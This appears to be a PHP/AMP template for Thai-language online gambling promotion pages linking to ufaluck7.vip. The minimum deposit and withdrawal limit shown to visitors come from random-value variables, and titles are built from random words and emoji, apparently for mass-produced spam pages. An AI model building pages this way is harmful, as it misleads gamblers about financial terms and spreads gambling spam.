    <style amp-boilerplate>body {-webkit-animation: -amp-start 8s steps(1, end) 0s 1 normal both;-moz-animation: -amp-start 8s steps(1, end) 0s 1 normal both;-ms-animation: -amp-start 8s steps(1, end) 0s 1 normal both;animation: -amp-start 8s steps(1, end) 0s 1 normal both}@-webkit-keyframes -amp-start {from {visibility: hidden}to {visibility: visible}}@-moz-keyframes -amp-start {from {visibility: hidden}to {visibility: visible}}@-ms-keyframes -amp-start {from {visibility: hidden}to {visibility: visible}}@-o-keyframes -amp-start {from {visibility: hidden}to {visibility: visible}}@keyframes    -amp-start {from {visibility: hidden}to {visibility: visible}}</style><noscript><style amp-boilerplate>body {-webkit-animation: none;-moz-animation: none;-ms-animation: none;animation: none}</style></noscript>
    <style amp-custom>:root{--white:#ffffff;--max-width:1080px;--n-space:min(max(12px,3.5vmin),30px);--n-space-s:min(max(8px,2vmin),20px);--n-space-xs:min(max(4px,1vmin),10px);--base:#1c0d0d;--primary:#222;--secondary:#580000;--secondary-hover:#5e0505;--tertiary:#d39393;--red:#9b0000;--blue:linear-gradient(to right, #d19e1d, #cfb05d, #e3a812);--radius:12px;--h1:calc(32px + (42 - 32) * ((100vw - 360px) / (1920 - 360)))}body{color:var(--white);background:#000000;font-family:-apple-system,system-ui,BlinkMacSystemFont,"Segoe UI",Helvetica,Arial,sans-serif,"Apple Color Emoji","Segoe UI Emoji","Segoe UI Symbol"}a{text-decoration:none;color:#fff}h1{font-size:var(--h1)}::-webkit-scrollbar{width:10px}::-webkit-scrollbar-track{background:var(--primary)}::-webkit-scrollbar-thumb{background:var(--white)}::-webkit-scrollbar-thumb:hover{background:#ff6600}.nav{background:#222;width:calc(100% - 30px);position:fixed;top:0;left:0;z-index:9999;display:flex;align-items:stretch;justify-content:space-between;padding:.5rem 1rem}.logo{background-color:#000000;border-radius:10px;transform:skewY(-3deg) skewX(-17deg);padding:36px 25px 16px 66px;margin:-30px 0 -20px -65px;display:flex;align-items:center}.logo-inner{transform:skewY(3deg) skewX(17deg);display:flex;align-items:center}.button-wrapper{display:flex;align-items:center}.button-wrapper a:first-child{margin-right:var(--n-space-s)}.n-container{max-width:var(--max-width);margin:auto;padding:0 var(--n-space)}.hero{padding-top:calc(var(--n-space) + var(--n-space) + var(--n-space))}.n-columns-gap{grid-gap:var(--n-space-s)}.n-columns-2{display:grid;grid-template-columns:repeat(2,1fr)}.n-columns-3{display:grid;grid-template-columns:repeat(3,1fr)}.n-columns-6{display:grid;grid-template-columns:repeat(6,1fr)}.n-columns-5{display:grid;grid-template-columns:repeat(5,1fr)}.n-span-2{grid-row:span 2/span 2;grid-column:span 2/span 2}.n-slots{border-radius:var(--radius)}.bg-container{background:linear-gradient(to right, #d19e1d, #cfb05d, #e3a812);border-radius:var(--radius)}.bg-container1{background:#3b3b3b;border-radius:var(--radius)}.padding-normal{padding:var(--n-space)}.padding-s{padding:var(--n-space-s)}.m-b-normal{margin-bottom:var(--n-space)}.middle{display:flex;flex-direction:column;justify-content:center}.center{display:flex;justify-content:center;align-items:center}.tabs{border-radius:var(--radius)}.tabs{background:#e30000}.tabs:hover{background:var(--secondary-hover)}.tabs img{margin-right:var(--n-space-s)}table{background:linear-gradient(to right, #d19e1d, #cfb05d, #e3a812);padding:var(--n-space);width:100%;border-radius:var(--radius)}td{background:#010101;border-radius:var(--radius);padding:var(--n-space-s)}@media    only screen and (max-width:768px){.n-columns-m-1{grid-template-columns:1fr}.n-columns-m-2{grid-template-columns:repeat(2,1fr)}.n-columns-m-3{grid-template-columns:repeat(3,1fr)}.n-span-2{grid-row:span 2/span 2;grid-column:span 2/span 2}.n-hidden{display:none}.hero{margin-bottom:var(--n-space)}}.btn,.btn-primary{background-color:var(--blue)}.btn,.btn-primary,.btn-secondary{color:#ff6600;border-radius:var(--radius);text-align:center;font-weight:700}.btn-secondary{background:#ff6600}.btn{padding:var(--n-space-s) var(--n-space);box-shadow:0 0 25px rgb(29 113 237 / 50%)}.btn-primary,.btn-secondary{font-size:15px;padding:var(--n-space-xs) var(--n-space-s)}.article{border:1px solid #ffffff;padding:var(--n-space);border-radius:var(--radius)}.contain{padding:var(--n-space)}.article p,li{color:#e5d6d6;line-height:1.6}.article a{color:#ff6600}.article ul{padding-left:1.5rem}.btn-link a{display:flex;width:100%;justify-content:center;font-weight:700;padding:var(--n-space-s)}.btn-link a:hover{color:var(--blue)}.menu-list{padding:0;display:flex;list-style:none;flex-wrap:wrap;text-align:center;white-space:nowrap;justify-content:center}.menu-list li{flex:0 0 25%;max-width:25%}.menu-list li div{padding:0 .5rem}.menu-list li a{display:flex;padding:5px 0;align-items:center;flex-direction:column;text-transform:uppercase;font-size:14px}.menu-list li a:hover{color:var(--blue)}.decimal{list-style:decimal}.daftar-isi{border: 1px solid #000000;padding: 10px; max-width: 500px; border-radius: 5px;}.daftar-isi ul{margin-top: .5rem;}.daftar-isi ul li a{color:#ff6600;text-decoration: underline;}.daftar-isi ul li a:hover{color:var(--blue)}.decimal{list-style: decimal;}</style>
     <script type="application/ld+json">
 
            </script>
</head>
<body>
  <div class="nav">
    <div class="logo">
      <div class="logo-inner">
        <a href="<?php echo $brand ?>">
          <amp-img src="./images/ufaluck7-logo.png" width="194" height="44px" layout="intrinsic" alt="<?php echo $brand ?>"></amp-img>
        </a>
      </div>
    </div>
    <div class="button-wrapper">
      <a href="https://ufaluck7.vip/" target="_blank" rel="nofollow" class="btn-secondary" style="color: white">รายการ</a>
      <a href="https://ufaluck7.vip/" target="_blank" rel="nofollow" class="btn-primary" style="color: white">เข้า</a>
    </div>
  </div>
  <header class="n-container hero">
      <div class="middle" style="text-align: center;">
        <amp-img src="./images/ufaluck7-banner.png" alt="<?php echo $brand ?> BANNER" width="1000" height="800" layout="responsive"></amp-img>
      </div> 
    </div>
  </header>
  <section class="n-container m-b-normal">
    <div class="bg-container padding-s m-b-normal">
      <ul class="menu-list">
        <li>
          <div>
              <a href="https://ufaluck7.vip/" target="_blank" rel="nofollow">
                <amp-img data-hero layout="intrinsic" height="30px" width="30px" src="https://pub-9d24670a2b8f4fb09f559ad4e8bf527e.r2.dev/android-wbmpdv-1.png" alt="<?php echo $brand ?> Thailand"></amp-img>
                แอปพลิเคชัน
              </a>
          </div>
        </li>
        <li>
          <div>
              <a href="https://ufaluck7.vip/" target="_blank" rel="nofollow">
                <amp-img data-hero layout="intrinsic" height="30px" width="30px" src="https://pub-9d24670a2b8f4fb09f559ad4e8bf527e.r2.dev/bonus-mqwb4s-1.png" alt="โบนัส <?php echo $brand ?>"></amp-img>
                โบนัส
              </a>
          </div>
        </li>
        <li>
          <div>
              <a href="https://ufaluck7.vip/" target="_blank" rel="nofollow">
                <amp-img data-hero layout="intrinsic" height="30px" width="30px" src="https://pub-9d24670a2b8f4fb09f559ad4e8bf527e.r2.dev/whatsapp-ea3wc5.png" alt="วอทส์แอพ <?php echo $brand ?>"></amp-img>
                วอทส์แอพ
              </a>
          </div>
        </li>
        <li>
          <div>
              <a href="https://ufaluck7.vip/" target="_blank" rel="nofollow">
                <amp-img data-hero layout="intrinsic" height="30px" width="30px" src="https://pub-9d24670a2b8f4fb09f559ad4e8bf527e.r2.dev/live-chat-k8zjuk.png" alt="แชทสด <?php echo $brand ?>"></amp-img>
                ติดต่อ
              </a>
          </div>
        </li>
        <li>
          <div>
          </div>
        </li>
      </ul>
    </div>
    <div class="bg-container n-columns-2 n-columns-m-2 n-columns-gap padding-s m-b-normal">
      <div class="center tabs btn-link">
        <a href="https://ufaluck7.vip/" target="_blank" rel="nofollow" >
        รายการ
        </a>
      </div>
      <div class="center tabs btn-link">
        <a href="https://ufaluck7.vip/" target="_blank" rel="nofollow" >
        เข้า
        </a>
      </div>
    </div>
  </section>
  <section class="n-container m-b-normal">
    <div class="n-columns-6 n-columns-m-3 n-columns-gap">
      <amp-img class="n-slots" src="https://pub-9d24670a2b8f4fb09f559ad4e8bf527e.r2.dev/mahjong-wins-3.jpeg" width="30px" height="35px" layout="responsive" alt="<?php echo $brand ?>"></amp-img>
      <amp-img class="n-slots" src="https://pub-9d24670a2b8f4fb09f559ad4e8bf527e.r2.dev/gates-of-olympus1000.jpeg" width="30px" height="35px" layout="responsive" alt="<?php echo $brand ?>"></amp-img>
      <amp-img class="n-slots" src="https://pub-9d24670a2b8f4fb09f559ad4e8bf527e.r2.dev/starlight-princess1000.jpeg" width="30px" height="35px" layout="responsive" alt="<?php echo $brand ?>"></amp-img>
      <amp-img class="n-slots" src="https://pub-9d24670a2b8f4fb09f559ad4e8bf527e.r2.dev/mahjong-wins-2.jpeg" width="30px" height="35px" layout="responsive" alt="<?php echo $brand ?>"></amp-img>
      <amp-img class="n-slots" src="https://pub-9d24670a2b8f4fb09f559ad4e8bf527e.r2.dev/sweet-bonanza1000.jpeg" width="30px" height="35px" layout="responsive" alt="<?php echo $brand ?>"></amp-img>
      <amp-img class="n-slots" src="https://pub-9d24670a2b8f4fb09f559ad4e8bf527e.r2.dev/sugar-rush1000.jpeg" width="30px" height="35px" layout="responsive" alt="<?php echo $brand ?>"></amp-img>
    </div>
  </section>
  <section class="n-container m-b-normal">
    <table>
      <tbody>
        <tr>
          <td>เว็บไซต์</td>
          <td><?php echo $brand ?></td>
        </tr>
        <tr> 
          <td>ฝากขั้นต่ำ</td>
          <td><?php echo $random_price ?></td>
        </tr>
        <tr>
          <td>ขีดจำกัดการถอน</td>
          <td><?php echo $random_prices ?></td>
        </tr>
        <tr>
          <td>วิธีการชำระเงิน</td>
          <td>🏧Bank, 💳E-Wallet, 🏁QRis</td>
        </tr>
        <tr>
          <td>เกม</td>
          <td>กีฬา, คาสิโน, เกม, มวยไทย, หวย</td>
        </tr>
      </tbody>
    </table>
  </section>
  <section class="n-container m-b-normal">
    <article class="bg-container2 contain" style="text-align: justify;">
      <div class="article">
      <h1 style="text-align: center;"><strong><?php echo $brand ?> <?php echo $randomEmoji ?> <?php echo $randomEmoji ?> - <?php echo $randomWord ?> <?php echo $title ?></strong></h1>
<p style="text-align: justify;"><?php echo $brand ?> <?php echo $isiarticle ?></p>
    </div></article>
  </section>
  <section class="n-container m-b-normal">
    <div class="container" style="text-align: center;">
      <span><b>© เว็บไซต์ <?php echo $brand ?></b></span>
    </div>
  </section>
</body>
</html>
